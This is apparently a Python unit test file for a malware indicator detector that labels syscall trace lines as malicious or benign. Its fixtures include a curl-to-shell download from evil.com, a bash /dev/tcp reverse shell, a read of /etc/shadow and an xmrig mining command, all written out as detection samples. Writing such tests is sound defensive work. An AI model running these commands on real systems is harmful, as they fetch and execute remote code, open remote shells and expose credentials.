"""
test_ioc_detector.py — Unit tests for the DynamicIOCDetector.
"""

from app.services.ioc_detector import DynamicIOCDetector


def test_detects_public_ip_in_connect() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("8.8.8.8")}, 16) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("8.8.8.8" in ioc for ioc in evidence.network_iocs)


def test_ignores_private_ip() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.168.1.1")}, 16) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "benign"
    assert not evidence.network_iocs


def test_detects_suspicious_port() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('connect(3, {sa_family=AF_INET, sin_port=htons(4444)}, 16) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("4444" in ioc for ioc in evidence.network_iocs)


def test_detects_sensitive_file_access() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 3')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("/etc/shadow" in ioc for ioc in evidence.file_iocs)


def test_detects_suspicious_exec() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('execve("/bin/sh", ["/bin/sh", "-c", "curl http://evil.com | sh"], ...) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert evidence.process_iocs


def test_detects_crypto_miner() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('execve("/usr/bin/xmrig", ["xmrig", "--url", "stratum+tcp://pool.example.com:3333"], ...) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert evidence.crypto_iocs


def test_detects_reverse_shell() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("reverse_shell" in ioc for ioc in evidence.process_iocs)


def test_benign_when_no_iocs() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line("read(3, '#!/usr/bin/env python3', 4096) = 22")
    detector.observe_line("write(1, 'Hello, World!', 13) = 13")
    evidence = detector.build_evidence()
    assert evidence.verdict == "benign"
    assert not evidence.dynamic_hit
